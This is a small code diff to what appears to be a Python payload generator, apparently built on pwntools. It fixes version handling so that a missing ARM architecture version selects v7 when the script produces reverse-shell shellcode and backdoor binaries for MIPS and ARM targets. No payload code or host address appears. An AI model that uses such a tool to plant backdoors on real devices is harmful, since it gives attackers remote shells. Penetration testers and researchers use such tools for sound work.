@@ -65,12 +65,12 @@ if __name__=="__main__":
 		if context.arch=="mips" and context.endian=="big":
 			generate_mips.generate_mips_shellcode(reverse_ip,reverse_port)
 		if context.arch=="arm"  and context.endian=='little':
-			if args.arch_version!="v7":
+			if args.arch_version!="v7" and  args.arch_version!=None:
 				generate_arm.generate_armelv5_shellcode(reverse_ip,reverse_port)
 			else:
 				generate_arm.generate_armelv7_shellcode(reverse_ip,reverse_port)
 		if context.arch=="arm" and context.endian=="big":
-			if args.arch_version!="v7":
+			if args.arch_version!="v7" and args.arch_version!=None:
 				generate_arm.generate_armebv5_shellcode(reverse_ip,reverse_port)
 			else:
 				generate_arm.generate_armebv7_shellcode(reverse_ip,reverse_port)
@@ -82,12 +82,12 @@ if __name__=="__main__":
 		if context.arch=="mips" and context.endian=="big":
 			generate_mips.generate_mips_backdoor(reverse_ip,reverse_port,filename)
 		if context.arch=="arm"  and context.endian=='little':
-			if args.arch_version!="v7":
+			if args.arch_version!="v7" and args.arch_version!=None:
 				generate_arm.generate_armelv5_backdoor(reverse_ip,reverse_port,filename)
 			else:
 				generate_arm.generate_armelv7_backdoor(reverse_ip,reverse_port,filename)
 		if context.arch=="arm" and context.endian=="big":
-			if args.arch_version!="v7":
+			if args.arch_version!="v7" and args.arch_version!=None:
 				generate_arm.generate_armebv5_backdoor(reverse_ip,reverse_port,filename)
 			else:
 				generate_arm.generate_armebv7_backdoor(reverse_ip,reverse_port,filename)
